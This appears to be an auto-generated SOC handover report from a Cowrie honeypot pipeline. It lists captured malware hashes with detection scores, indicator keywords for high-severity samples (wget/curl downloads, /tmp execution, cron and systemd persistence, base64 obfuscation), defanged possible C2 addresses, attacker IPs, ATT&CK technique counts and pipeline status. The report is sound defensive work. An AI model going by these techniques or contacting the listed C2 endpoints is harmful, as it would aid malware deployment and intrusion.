| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.248.120[.]6` | IN | Shivansh Infotech pvt Ltd | **100** ⚠️ | 0 |
| `58.209.82[.]184` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `112.168.176[.]15` | KR | Korea Telecom | **100** ⚠️ | 5 |
| `139.19.117[.]129` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `34.14.1[.]97` | BE | Google LLC | **100** ⚠️ | 2 |
| `45.79.207[.]181` | US | Linode | **100** ⚠️ | 50 |
| `187.16.96[.]250` | BR | Mundivox LTDA | **100** ⚠️ | 50 |
| `104.157.47[.]144` | CA | TELUS-DSL-EDTNABXM | **100** ⚠️ | 20 |
| `103.203.57[.]2` | US | Beijing Tiantexin Tech. Co., Ltd. | **100** ⚠️ | 50 |
| `104.250.184[.]70` | NL | Virtualine Technologies | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 246 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 186 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 66 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 60 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 9 |

---

## 🔕 False Positive Summary (35 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 16 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 390 cases |
| Tool 34  | Credential Extractor        | ✅ 3010 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 28 fingerprints |
| Tool 36  | Command Clustering          | ✅ 16 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 243 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 35 filtered (9.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 105 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 33 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 181 priority case(s) shown individually · 156 recon entry/entries in table (13 group(s) consolidating 31 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-14T16:11:24Z_
